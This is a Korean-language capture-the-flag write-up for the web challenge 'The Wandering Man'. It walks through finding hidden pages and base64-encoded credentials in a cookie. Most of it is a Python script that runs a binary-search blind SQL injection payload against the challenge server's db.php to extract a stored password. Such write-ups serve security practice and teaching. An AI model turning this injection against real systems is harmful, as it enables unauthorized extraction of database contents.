## No.11 Web The Wandering Man[100]

**점수:** 100

**분야:** Web

**제목:** The Wandering Man

-----

첫 페이지의 소스에서 anagram 발견 -> /another/2web2.html 발견.

두번째 페이지의 소스에서 힌트를 얻어 mainweb.php?userid=~~&pw~~ 요청 시 sos.php 에서 아이디와 암호가 날아온다

2web.2.html에 로그인하면 쿠키에 base64 인코딩 된 아이디와 암호가 있다.

다시 로그인 후 나온 페이지에서 블라인드 인젝션이 터진다.

아래 스크립트로 db를 턴다.

JamJam을 입력하면 답이 나온다.


```python
import urllib
import urllib2
 
def try_query(query):
    data = {
        'pw': query
    }
    req = urllib2.Request('http://223.194.105.182:46080/db.php', data=urllib.urlencode(data))
    result = urllib2.urlopen(req).read()
 
    return 'success' in result
 
flag = ""
i = 1
min = 0x20
max = 0x7f
 
while True:
    pivot = (min + max) / 2
 
    if pivot == min or pivot == max:
        flag += chr(pivot)
        min = 0x20
        max = 0x7f
        i += 1
        print flag
        continue
 
    query = "1' or substr((select binary concat(Ha,lo,Fre,und) from answer limit 5,1),{},1)<'{}'-- -".format(i, chr(pivot))
 
    if try_query(query):
        max = pivot
    else:
        min = pivot
 
# answer
#    Ha lo Fre und => passwdisJamJam
```
